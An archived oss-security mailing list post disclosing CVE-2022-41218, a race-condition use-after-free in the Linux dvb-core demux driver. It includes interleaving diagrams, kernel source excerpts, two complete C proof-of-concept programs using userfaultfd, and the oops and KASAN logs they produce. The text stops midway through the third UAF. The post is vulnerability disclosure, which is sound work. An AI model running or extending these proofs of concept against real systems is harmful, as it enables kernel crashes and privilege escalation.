=== Content from www.openwall.com_b0ff04be_20250114_211826.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](../../../2022/09/24/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20220923185134.GA364223@ubuntu>
Date: Fri, 23 Sep 2022 11:51:34 -0700
From: Hyunwoo Kim <imv4bel@...il.com>
To: oss-security@...ts.openwall.com
Subject: CVE-2022-41218: Linux dvb-core: UAF in dvb-core/dmxdev

Dear,

This security issue is a race-condition-to-UAF vulnerability that occurs in the dvb-core system.

CVE-2022-41218 has been assigned to this vulnerability.

# Introduction
This vulnerability is a race condition vulnerability that occurs in drivers/media/dvb-core/dmxdev.c.
Therefore, a race condition may occur in the usb device driver using this dmxdev.

This vulnerability could be used to trigger 3 UAFs.

# Vulnerability

## 1. slab UAF write
First, the order of the exploit is as follows(I debugged using drivers/media/usb/ttusb-dec/ttusb_dec.c):
```
                cpu0                                            cpu1                                    cpu 2
                                                        1. dvb_dvr_open()
2. ttusb_dec_disconnect()
   ttusb_dec_exit_dvb()
   dvb_dmxdev_release()
   wait_event(dmxdev->dvr_dvbdev->wait_queue, …)
                                                                                                3. dvb_demux_open()
                                                                                                   dvb_demux_ioctl()
                                                                                                   dvb_usercopy()
                                                                                                   copy_from_user()  <- userfaultfd stuck
                                                        4. dvb_dvr_release()
5. vfree(dmxdev->filter)
                                                                                                6. copy_from_user()    <- userfaultfd release
                                                                                                   dvb_demux_do_ioctl()
                                                                                                   struct dmxdev *dmxdev = dmxdevfilter->dev;  <- UAF!!
```

The detailed exploit flow is as follows:

1. open() dvr0 among the device nodes. This calls dvb_dvr_open() to cause ‘dvbdev->users++’ to run.
In this case, when ttusb_dec_disconnect() is executed by removing the usb device, the ‘wait_event(dmxdev->dvr_dvbdev->wait_queue, …)’ condition is caught.

2. Physically remove the USB device.
In this case, while the ttusb_dec_disconnect() function is being executed, it waits at ‘wait_event(dmxdev->dvr_dvbdev->wait_queue, …)’.

3. open() the demux0 node so that the dvb_demux_open() function is called.
This function also executes ‘dvbdev->users++’ similarly to the dvb_dvr_open() function in step 1.
However, this improper reference counting occurs because the dvb_dmxdev_release() function that is currently waiting has already passed the check for dvbdev->users:
```
void dvb_dmxdev_release(struct dmxdev *dmxdev)
{
        dmxdev->exit = 1;
        if (dmxdev->dvbdev->users > 1) {    // This check is bypassed. improper reference counting.
                wait_event(dmxdev->dvbdev->wait_queue,
                                dmxdev->dvbdev->users == 1);
        }
        if (dmxdev->dvr_dvbdev->users > 1) {
                wait_event(dmxdev->dvr_dvbdev->wait_queue,    // Currently wait()ing here.
                                dmxdev->dvr_dvbdev->users == 1);
        }

        dvb_unregister_device(dmxdev->dvbdev);
        dvb_unregister_device(dmxdev->dvr_dvbdev);

        vfree(dmxdev->filter);
        dmxdev->filter = NULL;
        dmxdev->demux->close(dmxdev->demux);
}
```

It then calls ioctl() on demux0. When calling, the 3rd argument submits the user-space address set by userfaultfd(or FUSE fs).
Now while ioctl is running it will hang at copy_from_user() of dvb_usercopy():
```
int dvb_usercopy(struct file *file,
                     unsigned int cmd, unsigned long arg,
                     int (*func)(struct file *file,
                     unsigned int cmd, void *arg))
{
        char    sbuf[128];
        void    *mbuf = NULL;
        void    *parg = NULL;
        int     err  = -EINVAL;

        /*  Copy arguments into temp kernel buffer  */
        switch (_IOC_DIR(cmd)) {
        case _IOC_NONE:
                /*
                 * For this command, the pointer is actually an integer
                 * argument.
                 */
                parg = (void *) arg;
                break;
        case _IOC_READ: /* some v4l ioctls are marked wrong ... */
        case _IOC_WRITE:
        case (_IOC_WRITE | _IOC_READ):
                if (_IOC_SIZE(cmd) <= sizeof(sbuf)) {
                        parg = sbuf;
                } else {
                        /* too big to allocate from stack */
                        mbuf = kmalloc(_IOC_SIZE(cmd), GFP_KERNEL);
                        if (NULL == mbuf)
                                return -ENOMEM;
                        parg = mbuf;
                }

                err = -EFAULT;
                if (copy_from_user(parg, (void __user *)arg, _IOC_SIZE(cmd)))   // here
                        goto out;
                break;
        }
```

4. close() the fd in the thread that open()ed the dvr0 node.
Then dvb_dvr_release() is called, and ‘dvbdev->users--’ and ‘wake_up(&dvbdev->wait_queue)’ are executed to wake up the dvb_dmxdev_release() function, which is the .disconnect flow.

5. In the .disconnect flow, dvb_dmxdev_release() function, vfree(dmxdev->filter) is executed.

6. Release userfaultfd from the demux0 ioctl thread that set userfaultfd.
This will cause the UAF to occur by reading the ‘dmxdev->filter’ address you just released from .disconnect.
UAF can now be used in all cases of dvb_demux_do_ioctl(), and even LPE is possible when linked with BPF.

Here is the PoC code:
```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>
#include <poll.h>
#include <pty.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <linux/userfaultfd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <stddef.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <linux/bpf.h>
#include <linux/ioctl.h>
#include <linux/types.h>

#include <linux/dvb/dmx.h>

#define CPU_0 1
#define CPU_1 2
#define CPU_2 3
#define CPU_3 4
#define UFFD_COUNT 1

#define die() do { \
        fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
        exit(EXIT_FAILURE); \
} while (0)

int fd;
int page_size;
int set1 = 0;
int set2 = 0;
int set3 = 0;
char *addr;
char *leak_addr;
char *text_addr;

void set_affinity(unsigned long mask) {
        if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
                perror("pthread_setaffinity_np");
        }
        return;
}

static void *fault_handler_thread(void *arg) {
        static struct uffd_msg msg;
        long uffd;
        static char *page = NULL;
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
        int qid;
        uintptr_t fault_addr;

        uffd = (long)arg;

        if (page == NULL) {
                page = mmap(NULL, page_size,
                                PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                if (page == MAP_FAILED){
                        perror("mmap");
                        die();
                }
        }

        for (;;) {
                struct pollfd pollfd;
                int nready;
                pollfd.fd = uffd;
                pollfd.events = POLLIN;
                nready = poll(&pollfd, 1, -1);
                if (nready == -1) {
                        perror("poll");
                        die();
                }

                nread = read(uffd, &msg, sizeof(msg));
                if (nread == 0) {
                        printf("EOF on userfaultfd!\n");
                        die();
                }

                if (nread == -1) {
                        perror("read");
                        die();
                }

                if (msg.event != UFFD_EVENT_PAGEFAULT) {
                        perror("Unexpected event on userfaultfd");
                        die();
                }

                fault_addr = msg.arg.pagefault.address;

                if (fault_addr == addr) {
                        printf("[step 4] ioctl ufd  pid : %ld\n", syscall(SYS_gettid));

                        set2 = 1;
                        while(!set3);

                        sleep(5);

                        uffdio_copy.src = (unsigned long)page;
                        uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(page_size - 1);
                        uffdio_copy.len = page_size;
                        uffdio_copy.mode = 0;
                        uffdio_copy.copy = 0;
                        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
                                perror("fault_handler_thread() - ioctl-UFFDIO_COPY case 1");
                                die();
                        }

                }
        }
}

void set_userfaultfd(void) {
        long uffd[UFFD_COUNT];
        struct uffdio_api uffdio_api[UFFD_COUNT];
        struct uffdio_register uffdio_register;
        pthread_t pf_hdr[UFFD_COUNT];
        int p[UFFD_COUNT];
        unsigned int size;

        size = page_size;

        addr = (char *)mmap(NULL,
                        page_size * UFFD_COUNT,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS,
                        -1, 0);

        for (int i = 0; i < UFFD_COUNT; i++) {
                uffd[i] = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
                if (uffd[i] == -1) {
                        perror("syscall : userfaultfd");
                        die();
                }

                uffdio_api[i].api = UFFD_API;
                uffdio_api[i].features = 0;
                if (ioctl(uffd[i], UFFDIO_API, &uffdio_api[i]) == -1) {
                        perror("ioctl() : UFFDIO_API");
                        die();
                }

                uffdio_register.range.start = (unsigned long)(addr + (page_size * i));
                uffdio_register.range.len   = size;
                uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
                if (ioctl(uffd[i], UFFDIO_REGISTER, &uffdio_register) == -1) {
                        perror("ioctl() : UFFDIO_REGISTER");
                        die();
                }

                p[i] = pthread_create(&pf_hdr[i], NULL, fault_handler_thread, (void *)uffd[i]);
                if (p[i] != 0) {
                        perror("pthread_create : page_fault_handler_thread");
                        die();
                }
        }
}

void *dvb_wait_queue(void) {
        int fd;
        int ret;

        //set_affinity(CPU_2);

        fd = open("/dev/dvb/adapter0/dvr0", O_RDONLY);
        if (fd > 0) {
                printf("[step 1] dvr0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));
        } else {
                perror("/dev/dvb/adapter0/dvr0 open() failed");
                die();
        }
        set1 = 1;

        while(!set2);
        sleep(5);

        close(fd);
        printf("[step 5] dvr0 close()  pid : %ld\n", syscall(SYS_gettid));

        sleep(5);
        set3 = 1;
}

void *demux_ioctl(void) {
        int ret;
        unsigned char tmp;
        char input[2];
        int fd;

        //set_affinity(CPU_1);

        while(!set1);
        printf("Disconnect now (After disconnecting, type enter)\n");
        read(0, input, 1);
        printf("[step 2] disconnect dvb usb\n");

        fd = open("/dev/dvb/adapter0/demux0", O_RDWR);
        if (fd > 0) {
                printf("[step 3] demux0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));

        } else {
                perror("/dev/dvb/adapter0/demux0 open() failed");
                die();
        }

        ret = ioctl(fd, DMX_SET_FILTER, addr);
        printf("[step 6] demux0 ioctl()  ret : %d  pid : %ld\n", ret, syscall(SYS_gettid));

        sleep(5);
}

int main() {
        pthread_t pf_hdr;
        int p1, p2;
        int status1, status2;
        pthread_t hdr1, hdr2;
        int ret;

        page_size = sysconf(_SC_PAGE_SIZE);

        //set_affinity(CPU_0);

        set_userfaultfd();

        p1 = pthread_create(&hdr1, NULL, dvb_wait_queue, (void *)NULL);
        if (p1 != 0) {
                perror("pthread_create 1");
                die();
        }

        p2 = pthread_create(&hdr2, NULL, demux_ioctl, (void *)NULL);
        if (p2 != 0) {
                perror("pthread_create 2");
                die();
        }

        pthread_join(hdr1, (void **)&status1);
        pthread_join(hdr2, (void **)&status2);

        return 0;
}
```

The kernel log looks like this:
```
[   83.990720] BUG: unable to handle page fault for address: ffffc900013c5060
[   83.990733] #PF: supervisor read access in kernel mode
[   83.990739] #PF: error_code(0x0000) - not-present page
[   83.990744] PGD 100000067 P4D 100000067 PUD 1001dd067 PMD 1078fc067 PTE 0
[   83.990760] Oops: 0000 [#1] PREEMPT SMP NOPTI
[   83.990768] CPU: 2 PID: 2580 Comm: exploit Not tainted 6.0.0-rc2+ #3
[   83.990776] Hardware name: Gigabyte Technology Co., Ltd. B460MDS3H/B460M DS3H, BIOS F3 05/27/2020
[   83.990781] RIP: 0010:dvb_demux_do_ioctl+0x22/0x5b0 [dvb_core]
[   83.990809] Code: 00 00 00 00 0f 1f 40 00 0f 1f 44 00 00 55 48 89 e5 41 57 49 89 d7 41 56 41 55 41 54 53 89 f3 48 84
[   83.990816] RSP: 0018:ffffc90001a3fd10 EFLAGS: 00010282
[   83.990824] RAX: 0000000000000000 RBX: 00000000403c6f2b RCX: ffffffffc051c520
[   83.990830] RDX: ffffc90001a3fd80 RSI: 00000000403c6f2b RDI: ffff88810c4adc00
[   83.990835] RBP: ffffc90001a3fd58 R08: 0000000000000000 R09: 0000000000000000
[   83.990840] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000fffffff2
[   83.990845] R13: ffffc900013c5000 R14: ffff88810c4adc00 R15: ffffc90001a3fd80
[   83.990850] FS:  00007f0c4fdd7640(0000) GS:ffff88844ea80000(0000) knlGS:0000000000000000
[   83.990857] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   83.990863] CR2: ffffc900013c5060 CR3: 000000010b31e001 CR4: 00000000007706e0
[   83.990869] PKRU: 55555554
[   83.990873] Call Trace:
[   83.990877]  <TASK>
[   83.990886]  dvb_usercopy+0x55/0x1a0 [dvb_core]
[   83.990907]  ? dvb_dmxdev_filter_start+0x3b0/0x3b0 [dvb_core]
[   83.990932]  dvb_demux_ioctl+0x15/0x20 [dvb_core]
[   83.990951]  __x64_sys_ioctl+0x92/0xd0
[   83.990965]  do_syscall_64+0x59/0x90
[   83.990973]  ? debug_smp_processor_id+0x17/0x20
[   83.990984]  ? fpregs_assert_state_consistent+0x2a/0x50
[   83.990995]  ? exit_to_user_mode_prepare+0x49/0x1a0
[   83.991007]  ? syscall_exit_to_user_mode+0x26/0x50
[   83.991016]  ? __x64_sys_write+0x19/0x20
[   83.991024]  ? do_syscall_64+0x69/0x90
[   83.991030]  ? irqentry_exit_to_user_mode+0x9/0x20
[   83.991039]  ? irqentry_exit+0x3b/0x50
[   83.991048]  ? exc_page_fault+0x87/0x180
[   83.991056]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[   83.991068] RIP: 0033:0x454b7f
[   83.991075] Code: 00 48 89 44 24 18 31 c0 48 8d 44 24 60 c7 04 24 10 00 00 00 48 89 44 24 08 48 8d 44 24 20 48 89 40
[   83.991081] RSP: 002b:00007f0c4fdd7150 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
[   83.991090] RAX: ffffffffffffffda RBX: 00007f0c4fdd7640 RCX: 0000000000454b7f
[   83.991095] RDX: 00007f0c50dda000 RSI: 00000000403c6f2b RDI: 0000000000000005
[   83.991100] RBP: 00007f0c4fdd71d0 R08: 0000000000000000 R09: 0000000000000000
[   83.991104] R10: 000000000000000a R11: 0000000000000246 R12: 00007f0c4fdd7640
[   83.991109] R13: 0000000000000000 R14: 000000000041ba00 R15: 00007f0c4f5d7000
[   83.991118]  </TASK>
[   83.991121] Modules linked in: snd_usb_audio usbhid hid snd_usbmidi_lib ttusb_dec ttusbdecfe dvb_core mc snd_sof_pca
[   83.991249]  sysfillrect rapl sysimgblt snd intel_cstate mei_me soundcore ee1004 mei gigabyte_wmi wmi_bmof serial_mt
[   83.991333] CR2: ffffc900013c5060
[   83.991339] ---[ end trace 0000000000000000 ]---
[   83.991344] RIP: 0010:dvb_demux_do_ioctl+0x22/0x5b0 [dvb_core]
[   83.991366] Code: 00 00 00 00 0f 1f 40 00 0f 1f 44 00 00 55 48 89 e5 41 57 49 89 d7 41 56 41 55 41 54 53 89 f3 48 84
[   83.991372] RSP: 0018:ffffc90001a3fd10 EFLAGS: 00010282
[   83.991378] RAX: 0000000000000000 RBX: 00000000403c6f2b RCX: ffffffffc051c520
[   83.991383] RDX: ffffc90001a3fd80 RSI: 00000000403c6f2b RDI: ffff88810c4adc00
[   83.991387] RBP: ffffc90001a3fd58 R08: 0000000000000000 R09: 0000000000000000
[   83.991392] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000fffffff2
[   83.991396] R13: ffffc900013c5000 R14: ffff88810c4adc00 R15: ffffc90001a3fd80
[   83.991401] FS:  00007f0c4fdd7640(0000) GS:ffff88844ea80000(0000) knlGS:0000000000000000
[   83.991407] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   83.991412] CR2: ffffc900013c5060 CR3: 000000010b31e001 CR4: 00000000007706e0
[   83.991417] PKRU: 55555554
```

## 2. UAF that allows arbitrary address execution
First, the order of the exploit is as follows:
```
                cpu0                                            cpu1                                    cpu 2
                                                        1. dvb_dvr_open()
2. ttusb_dec_disconnect()
   ttusb_dec_exit_dvb()
   dvb_dmxdev_release()
   wait_event(dmxdev->dvr_dvbdev->wait_queue, ...)
                                                                                                3. dvb_demux_open()
                                                        4. dvb_dvr_release()
5. dvb_unregister_device(dmxdev->dvbdev)
   dvb_free_device()
   kfree (dvbdev->fops)
                                                                                                6. close(demux0)
                                                                                                   __x64_sys_close()
                                                                                                   close_fd()
                                                                                                   filp_close()
                                                                                                   filp->f_op->flush(filp, id);  <- UAF!!
```

The detailed exploit flow is as follows:

1 ~ 4. The order of 1-4 is the same as the first vulnerability.

5. In the .disconnect flow, "dvb_unregister_device(dmxdev->dvbdev) -> dvb_free_device() -> kfree (dvbdev->fops)" is executed.
Here, kfree()ed "dvbdev->fops" is the target of UAF vulnerability.

6. close() the demux0 fd in the thread that open()ed the demux0 node.
In fact, when opening a dvb device node such as demux0, "dvb_device_open()" is called first, not dvb_XXX_open():
```
static int dvb_device_open(struct inode *inode, struct file *file)
{
        struct dvb_device *dvbdev;

        mutex_lock(&dvbdev_mutex);
        down_read(&minor_rwsem);
        dvbdev = dvb_minors[iminor(inode)];

        if (dvbdev && dvbdev->fops) {
                int err = 0;
                const struct file_operations *new_fops;

                new_fops = fops_get(dvbdev->fops);
                if (!new_fops)
                        goto fail;
                file->private_data = dvbdev;
                replace_fops(file, new_fops);    // replace fops here.
                if (file->f_op->open)
                        err = file->f_op->open(inode, file);    // call dvb_XXX_open()
                up_read(&minor_rwsem);
                mutex_unlock(&dvbdev_mutex);
                return err;
        }
fail:
        up_read(&minor_rwsem);
        mutex_unlock(&dvbdev_mutex);
        return -ENODEV;
}
```
After the above function is called, "replace_fops(file, new_fops);" to replace file->f_op with "dvbdev->fops".
This "dvbdev->fops" is the target of this UAF vulnerability, as explained in step 5.

Returning to the flow, the close() system calls are executed in the order of "__x64_sys_close() -> close_fd() -> filp_close()" because close(demux0) was called:
```
int filp_close(struct file *filp, fl_owner_t id)
{
        int retval = 0;

        if (!file_count(filp)) {
                printk(KERN_ERR "VFS: Close: file count is 0\n");
                return 0;
        }

        if (filp->f_op->flush)
                retval = filp->f_op->flush(filp, id);    // UAF!!

        if (likely(!(filp->f_mode & FMODE_PATH))) {
                dnotify_flush(filp, id);
                locks_remove_posix(filp, id);
        }
        fput(filp);
        return retval;
}
```
In the above function, "filp->f_op->flush(filp, id);" is called, and UAF occurs because this f_op is the fops kfree()ed in step 5.
This, in conjunction with kmalloc heap spraying, becomes a vulnerability that can execute any desired address.

Here is the PoC code:
```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>
#include <poll.h>
#include <pty.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <linux/userfaultfd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <stddef.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <linux/bpf.h>
#include <linux/ioctl.h>
#include <linux/types.h>

#include <linux/dvb/dmx.h>

#define CPU_0 1
#define CPU_1 2
#define CPU_2 3
#define CPU_3 4

#define die() do { \
        fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
        exit(EXIT_FAILURE); \
} while (0)

int fd;
int set1 = 0;
int set2 = 0;
int set3 = 0;

void set_affinity(unsigned long mask) {
        if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
                perror("pthread_setaffinity_np");
        }
        return;
}

void *dvb_wait_queue(void) {
        int fd;
        int ret;

        //set_affinity(CPU_2);

        fd = open("/dev/dvb/adapter0/dvr0", O_RDONLY);
        if (fd > 0) {
                printf("[step 1] dvr0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));
        } else {
                perror("/dev/dvb/adapter0/dvr0 open() failed");
                die();
        }
        set1 = 1;

        while(!set2);
        close(fd);
        set3 = 1;
        printf("[step 4] dvr0 close()  pid : %ld\n", syscall(SYS_gettid));

        sleep(5);
}

void *demux_close(void) {
        int ret;
        unsigned char tmp;
        char input[2];
        int fd;

        //set_affinity(CPU_1);

        while(!set1);
        printf("Disconnect now (After disconnecting, type enter) : \n");
        read(0, input, 1);
        printf("[step 2] disconnect dvb usb\n");

        fd = open("/dev/dvb/adapter0/demux0", O_RDWR);
        if (fd > 0) {
                printf("[step 3] demux0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));

        } else {
                perror("/dev/dvb/adapter0/demux0 open() failed");
                die();
        }
        set2 = 1;

        while(!set3);
        usleep(60);
        close(fd);
        printf("[step 5] demux0 close()  pid : %ld\n", syscall(SYS_gettid));

        sleep(5);
}

int main() {
        pthread_t pf_hdr;
        int p1, p2;
        int status1, status2;
        pthread_t hdr1, hdr2;
        int ret;

        //set_affinity(CPU_0);

        p1 = pthread_create(&hdr1, NULL, dvb_wait_queue, (void *)NULL);
        if (p1 != 0) {
                perror("pthread_create 1");
                die();
        }

        p2 = pthread_create(&hdr2, NULL, demux_close, (void *)NULL);
        if (p2 != 0) {
                perror("pthread_create 2");
                die();
        }

        pthread_join(hdr1, (void **)&status1);
        pthread_join(hdr2, (void **)&status2);

        return 0;
}
```

Here is the KASAN log:
```
[  708.982899] ==================================================================
[  708.982921] BUG: KASAN: use-after-free in filp_close+0x119/0x140
[  708.982929] Read of size 8 at addr ffff888114bd4078 by task exploit2/2918

[  708.982933] CPU: 7 PID: 2918 Comm: exploit2 Not tainted 6.0.0-rc2+ #4
[  708.982936] Hardware name: Gigabyte Technology Co., Ltd. B460MDS3H/B460M DS3H, BIOS F3 05/27/2020
[  708.982938] Call Trace:
[  708.982954]  <TASK>
[  708.982956]  dump_stack_lvl+0x49/0x63
[  708.982960]  print_report.cold+0x5e/0x5d9
[  708.982963]  ? filp_close+0x119/0x140
[  708.982966]  kasan_report+0xa0/0x120
[  708.982969]  ? filp_close+0x119/0x140
[  708.982972]  __asan_report_load8_noabort+0x14/0x20
[  708.982975]  filp_close+0x119/0x140
[  708.982978]  close_fd+0x75/0x90
[  708.982981]  __x64_sys_close+0x30/0x80
[  708.982984]  do_syscall_64+0x59/0x90
[  708.982987]  ? syscall_exit_to_user_mode+0x26/0x50
[  708.982990]  ? do_syscall_64+0x69/0x90
[  708.982994]  ? syscall_exit_to_user_mode+0x26/0x50
[  708.983017]  ? __do_sys_gettid+0x1b/0x30
[  708.983022]  ? do_syscall_64+0x69/0x90
[  708.983027]  ? exit_to_user_mode_prepare+0x49/0x1a0
[  708.983035]  ? irqentry_exit_to_user_mode+0x9/0x20
[  708.983041]  ? irqentry_exit+0x3b/0x50
[  708.983045]  ? exc_page_fault+0x72/0xf0
[  708.983050]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[  708.983072] RIP: 0033:0x45396b
[  708.983077] Code: 03 00 00 00 0f 05 48 3d 00 f0 ff ff 77 41 c3 48 83 ec 18 89 7c 24 0c e8 33 a9 02 00 8b 7c 24 0c 41 89 c0 b8 03 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 35 44 89 c7 89 44 24 0c e8 81 a9 02 00 8b 44
[  708.983081] RSP: 002b:00007f55128b41a0 EFLAGS: 00000293 ORIG_RAX: 0000000000000003
[  708.983087] RAX: ffffffffffffffda RBX: 00007f55128b4640 RCX: 000000000045396b
[  708.983091] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000004
[  708.983094] RBP: 00007f55128b41d0 R08: 0000000000000000 R09: 0000000000000000
[  708.983097] R10: 0000000000000000 R11: 0000000000000293 R12: 00007f55128b4640
[  708.983100] R13: 0000000000000000 R14: 000000000041b3e0 R15: 00007f55120b4000
[  708.983107]  </TASK>

[  708.983130] Allocated by task 663:
[  708.983133]  kasan_save_stack+0x26/0x50
[  708.983137]  __kasan_kmalloc+0xae/0xe0
[  708.983140]  __kmalloc_node+0x185/0x420
[  708.983145]  memcg_alloc_slab_cgroups+0x8a/0x130
[  708.983149]  allocate_slab+0x389/0x4a0
[  708.983152]  ___slab_alloc+0x6c5/0xa50
[  708.983155]  __slab_alloc.constprop.0+0x5a/0xb0
[  708.983159]  kmem_cache_alloc+0x2e3/0x320
[  708.983162]  seq_open+0x57/0x160
[  708.983166]  kernfs_fop_open+0x4f0/0xc10
[  708.983171]  do_dentry_open+0x404/0xf80
[  708.983174]  vfs_open+0x9f/0xd0
[  708.983177]  path_openat+0xd58/0x3f60
[  708.983181]  do_filp_open+0x1b1/0x3e0
[  708.983184]  do_sys_openat2+0x132/0x450
[  708.983187]  __x64_sys_openat+0x128/0x210
[  708.983191]  do_syscall_64+0x59/0x90
[  708.983194]  entry_SYSCALL_64_after_hwframe+0x63/0xcd

[  708.983201] Freed by task 159:
[  708.983204]  kasan_save_stack+0x26/0x50
[  708.983207]  kasan_set_track+0x25/0x40
[  708.983211]  kasan_set_free_info+0x24/0x40
[  708.983215]  ____kasan_slab_free+0x176/0x1e0
[  708.983218]  __kasan_slab_free+0x12/0x20
[  708.983221]  slab_free_freelist_hook+0xd0/0x1a0
[  708.983224]  kfree+0x1ae/0x3e0
[  708.983227]  dvb_free_device.part.0+0x33/0x70 [dvb_core]
[  708.983241]  dvb_unregister_device+0x20/0x30 [dvb_core]
[  708.983248]  dvb_dmxdev_release+0x3ba/0x4e3 [dvb_core]
[  708.983255]  ttusb_dec_disconnect+0x3d8/0x499 [ttusb_dec]
[  708.983258]  usb_unbind_interface+0x187/0x7c0
[  708.983261]  device_remove+0x117/0x170
[  708.983264]  device_release_driver_internal+0x418/0x660
[  708.983266]  device_release_driver+0x12/0x20
[  708.983268]  bus_remove_device+0x28f/0x540
[  708.983270]  device_del+0x501/0xc30
[  708.983273]  usb_disable_device+0x2a5/0x660
[  708.983274]  usb_disconnect.cold+0x1f9/0x620
[  708.983277]  hub_event+0x16d3/0x3d20
[  708.983280]  process_one_work+0x778/0x11c0
[  708.983283]  worker_thread+0x544/0x1180
[  708.983285]  kthread+0x280/0x320
[  708.983286]  ret_from_fork+0x1f/0x30

[  708.983291] The buggy address belongs to the object at ffff888114bd4000
                which belongs to the cache kmalloc-512 of size 512
[  708.983293] The buggy address is located 120 bytes inside of
                512-byte region [ffff888114bd4000, ffff888114bd4200)

[  708.983297] The buggy address belongs to the physical page:
[  708.983298] page:000000009b45bbf6 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x114bd0
[  708.983301] head:000000009b45bbf6 order:3 compound_mapcount:0 compound_pincount:0
[  708.983303] flags: 0x17ffffc0010200(slab|head|node=0|zone=2|lastcpupid=0x1fffff)
[  708.983307] raw: 0017ffffc0010200 dead000000000100 dead000000000122 ffff888100042c80
[  708.983309] raw: 0000000000000000 0000000080200020 00000001ffffffff 0000000000000000
[  708.983311] page dumped because: kasan: bad access detected

[  708.983313] Memory state around the buggy address:
[  708.983314]  ffff888114bd3f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  708.983316]  ffff888114bd3f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  708.983318] >ffff888114bd4000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  708.983320]                                                                 ^
[  708.983321]  ffff888114bd4080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  708.983323]  ffff888114bd4100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  708.983325] ==================================================================
[  708.983336] Disabling lock debugging due to kernel taint
```

## 3. UAF write vulnerability
The third slab UAF vulnerability is almost identical to the second one.
It only occurs in minute race condition time differences.

the order of the exploit is as follows:
```
                cpu0                                            cpu1                                    cpu 2
                                                        1. dvb_dvr_open()
2. ttusb_dec_disconnect()
   ttusb_dec_exit_dvb()
   dvb_dmxdev_release()
   wait_event(dmxdev->dvr_dvbdev->wait_queue, ...)
                                                                                                3. dvb_demux_open()
                                                        4. dvb_dvr_release()
5. dvb_unregister_device(dmxdev->dvbdev)
   dvb_free_device()
   kfree (dvbdev)
                                                                                                6. dvb_demux_release()
                                                                                                   dmxdev->dvbdev->users--;  <- UAF!!
```

The detailed exploit flow is as follows:

1 ~ 4. The order of 1-4 is the same as the first vulnerability.

5. This time, "dvbdev", not "dvbdev->fops", is the target of the UAF vulnerability:
```
